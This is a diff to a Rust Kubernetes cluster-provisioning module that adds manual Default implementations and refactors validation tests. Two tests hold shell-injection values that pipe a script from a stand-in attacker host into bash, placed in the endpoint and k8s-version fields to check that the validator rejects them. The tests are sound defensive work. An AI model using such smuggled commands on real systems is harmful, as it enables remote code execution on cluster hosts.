@@ -24,7 +24,7 @@ use super::util::state_root;
 use super::vmimage::VmImageStore;
 use super::{k8s_recipes, vm as vm_cmd, vmimage};
 
-#[derive(Debug, Deserialize, Default)]
+#[derive(Debug, Deserialize)]
 struct SshSpec {
     #[serde(default = "default_ssh_user")]
     user: String,
@@ -34,6 +34,17 @@ struct SshSpec {
     key: Option<PathBuf>,
     #[serde(default)]
     port: Option<u16>,
+}
+
+/// `Default` MANUAL (não derivado) de propósito: o derive daria `user: ""`, e
+/// como `ClusterSpec.ssh` é `#[serde(default)]`, um manifesto SEM bloco `ssh:`
+/// ficaria com utilizador VAZIO em vez de `delonix` — o `default_ssh_user` só
+/// se aplica quando o bloco existe mas lhe falta o campo. Mesmo padrão de
+/// `EtcdSpec`/`KindModeSpec`.
+impl Default for SshSpec {
+    fn default() -> Self {
+        SshSpec { user: default_ssh_user(), key: None, port: None }
+    }
 }
 
 fn default_ssh_user() -> String {
@@ -102,6 +113,30 @@ struct ClusterSpec {
     kind: KindModeSpec,
     #[serde(default)]
     vm: VmModeSpec,
+}
+
+/// `Default` MANUAL, espelhando EXACTAMENTE os `#[serde(default = ...)]` de
+/// cima — um `ClusterSpec::default()` tem de ser indistinguível de um manifesto
+/// vazio desserializado. Existe sobretudo para os testes poderem usar
+/// `ClusterSpec { campo: x, ..Default::default() }` e não voltarem a partir de
+/// cada vez que o schema ganha um campo novo.
+impl Default for ClusterSpec {
+    fn default() -> Self {
+        ClusterSpec {
+            mode: default_mode(),
+            ssh: SshSpec::default(),
+            etcd: EtcdSpec::default(),
+            control_plane_endpoint: None,
+            control_plane: NodesSpec::default(),
+            workers: NodesSpec::default(),
+            k8s_version: None,
+            pod_subnet: default_pod_subnet(),
+            service_subnet: default_service_subnet(),
+            cni: default_cni(),
+            kind: KindModeSpec::default(),
+            vm: VmModeSpec::default(),
+        }
+    }
 }
 
 fn default_mode() -> String {
@@ -1027,17 +1062,24 @@ kubeadm join 10.0.0.10:6443 --token abcdef.0123456789abcdef \\
         assert!(!valid_version(""));
     }
 
+    /// Um `ClusterSpec` mínimo e VÁLIDO no `mode: ssh` (1 control-plane), para
+    /// cada teste de `validate` só ter de sobrepor o campo que está a exercitar.
+    fn spec_ssh_1cp() -> ClusterSpec {
+        ClusterSpec {
+            mode: "ssh".into(),
+            control_plane: NodesSpec {
+                replicas: None,
+                hosts: vec![HostSpec { ip: "10.0.0.1".into(), hostname: None }],
+            },
+            ..Default::default()
+        }
+    }
+
     #[test]
     fn validate_recusa_endpoint_malicioso_no_manifesto_completo() {
         let spec = ClusterSpec {
-            ssh: SshSpec { user: "delonix".into(), key: None },
-            etcd: EtcdSpec::default(),
             control_plane_endpoint: Some("10.0.0.10; curl http://attacker/pwn.sh | bash; #".into()),
-            control_plane: vec![HostSpec { ip: "10.0.0.1".into(), hostname: None }],
-            workers: vec![],
-            k8s_version: None,
-            pod_subnet: default_pod_subnet(),
-            service_subnet: default_service_subnet(),
+            ..spec_ssh_1cp()
         };
         let err = validate(&spec).unwrap_err();
         assert!(format!("{err}").contains("controlPlaneEndpoint"));
@@ -1045,16 +1087,7 @@ kubeadm join 10.0.0.10:6443 --token abcdef.0123456789abcdef \\
 
     #[test]
     fn validate_recusa_k8s_version_maliciosa() {
-        let spec = ClusterSpec {
-            ssh: SshSpec { user: "delonix".into(), key: None },
-            etcd: EtcdSpec::default(),
-            control_plane_endpoint: None,
-            control_plane: vec![HostSpec { ip: "10.0.0.1".into(), hostname: None }],
-            workers: vec![],
-            k8s_version: Some("1.31; curl evil|bash #".into()),
-            pod_subnet: default_pod_subnet(),
-            service_subnet: default_service_subnet(),
-        };
+        let spec = ClusterSpec { k8s_version: Some("1.31; curl evil|bash #".into()), ..spec_ssh_1cp() };
         let err = validate(&spec).unwrap_err();
         assert!(format!("{err}").contains("k8sVersion"));
     }
@@ -1069,16 +1102,7 @@ kubeadm join 10.0.0.10:6443 --token abcdef.0123456789abcdef \\
 
     #[test]
     fn validate_recusa_etcd_external() {
-        let spec = ClusterSpec {
-            ssh: SshSpec { user: "delonix".into(), key: None },
-            etcd: EtcdSpec { mode: "external".into() },
-            control_plane_endpoint: None,
-            control_plane: vec![HostSpec { ip: "10.0.0.1".into(), hostname: None }],
-            workers: vec![],
-            k8s_version: None,
-            pod_subnet: default_pod_subnet(),
-            service_subnet: default_service_subnet(),
-        };
+        let spec = ClusterSpec { etcd: EtcdSpec { mode: "external".into() }, ..spec_ssh_1cp() };
         let err = validate(&spec).unwrap_err();
         assert!(format!("{err}").contains("etcd"));
     }
@@ -1086,17 +1110,14 @@ kubeadm join 10.0.0.10:6443 --token abcdef.0123456789abcdef \\
     #[test]
     fn validate_exige_endpoint_com_multiplos_control_planes() {
         let spec = ClusterSpec {
-            ssh: SshSpec { user: "delonix".into(), key: None },
-            etcd: EtcdSpec::default(),
-            control_plane_endpoint: None,
-            control_plane: vec![
-                HostSpec { ip: "10.0.0.1".into(), hostname: None },
-                HostSpec { ip: "10.0.0.2".into(), hostname: None },
-            ],
-            workers: vec![],
-            k8s_version: None,
-            pod_subnet: default_pod_subnet(),
-            service_subnet: default_service_subnet(),
+            control_plane: NodesSpec {
+                replicas: None,
+                hosts: vec![
+                    HostSpec { ip: "10.0.0.1".into(), hostname: None },
+                    HostSpec { ip: "10.0.0.2".into(), hostname: None },
+                ],
+            },
+            ..spec_ssh_1cp()
         };
         let err = validate(&spec).unwrap_err();
         assert!(format!("{err}").contains("controlPlaneEndpoint"));
@@ -1104,52 +1125,60 @@ kubeadm join 10.0.0.10:6443 --token abcdef.0123456789abcdef \\
 
     #[test]
     fn validate_aceita_1_control_plane_sem_endpoint() {
-        let spec = ClusterSpec {
-            ssh: SshSpec { user: "delonix".into(), key: None },
-            etcd: EtcdSpec::default(),
-            control_plane_endpoint: None,
-            control_plane: vec![HostSpec { ip: "10.0.0.1".into(), hostname: None }],
-            workers: vec![],
-            k8s_version: None,
-            pod_subnet: default_pod_subnet(),
-            service_subnet: default_service_subnet(),
-        };
-        assert!(validate(&spec).is_ok());
+        assert!(validate(&spec_ssh_1cp()).is_ok());
     }
 
     #[test]
     fn validate_recusa_control_plane_vazio() {
-        let spec = ClusterSpec {
-            ssh: SshSpec { user: "delonix".into(), key: None },
-            etcd: EtcdSpec::default(),
-            control_plane_endpoint: None,
-            control_plane: vec![],
-            workers: vec![],
-            k8s_version: None,
-            pod_subnet: default_pod_subnet(),
-            service_subnet: default_service_subnet(),
-        };
+        let spec = ClusterSpec { control_plane: NodesSpec::default(), ..spec_ssh_1cp() };
         assert!(validate(&spec).is_err());
     }
 
     #[test]
     fn cluster_spec_desserializa_de_yaml_completo() {
         let yaml = "\
+mode: ssh
 ssh: { user: delonix, key: /home/delonix/.ssh/id_ed25519 }
 etcd: { mode: stacked }
 controlPlaneEndpoint: lb.exemplo.com
 controlPlane:
-  - { ip: 10.0.0.10, hostname: cp1 }
-  - { ip: 10.0.0.11, hostname: cp2 }
+  hosts:
+    - { ip: 10.0.0.10, hostname: cp1 }
+    - { ip: 10.0.0.11, hostname: cp2 }
 workers:
-  - { ip: 10.0.0.20, hostname: w1 }
+  hosts:
+    - { ip: 10.0.0.20, hostname: w1 }
 k8sVersion: \"1.31\"
 ";
         let spec: ClusterSpec = serde_yaml::from_str(yaml).unwrap();
-        assert_eq!(spec.control_plane.len(), 2);
-        assert_eq!(spec.workers.len(), 1);
+        assert_eq!(spec.control_plane.hosts.len(), 2);
+        assert_eq!(spec.workers.hosts.len(), 1);
         assert_eq!(spec.control_plane_endpoint.as_deref(), Some("lb.exemplo.com"));
         assert_eq!(spec.pod_subnet, default_pod_subnet());
+    }
+
+    /// O `Default` manual de `ClusterSpec` tem de ser indistinguível de um
+    /// manifesto vazio — se divergir, os testes acima passam a exercitar um
+    /// spec que o parser nunca produziria.
+    #[test]
+    fn cluster_spec_default_igual_ao_yaml_vazio() {
+        let spec: ClusterSpec = serde_yaml::from_str("{}").unwrap();
+        let def = ClusterSpec::default();
+        assert_eq!(spec.mode, def.mode);
+        assert_eq!(spec.ssh.user, def.ssh.user);
+        assert_eq!(spec.etcd.mode, def.etcd.mode);
+        assert_eq!(spec.pod_subnet, def.pod_subnet);
+        assert_eq!(spec.service_subnet, def.service_subnet);
+        assert_eq!(spec.cni, def.cni);
+        assert_eq!(spec.kind.image, def.kind.image);
+    }
+
+    /// Um manifesto SEM bloco `ssh:` tem de ficar com o utilizador canónico
+    /// (`delonix`), não com a string vazia — regressão do `Default` derivado.
+    #[test]
+    fn ssh_user_cai_no_default_quando_o_bloco_ssh_e_omitido() {
+        let spec: ClusterSpec = serde_yaml::from_str("mode: ssh").unwrap();
+        assert_eq!(spec.ssh.user, "delonix");
     }
 }
 
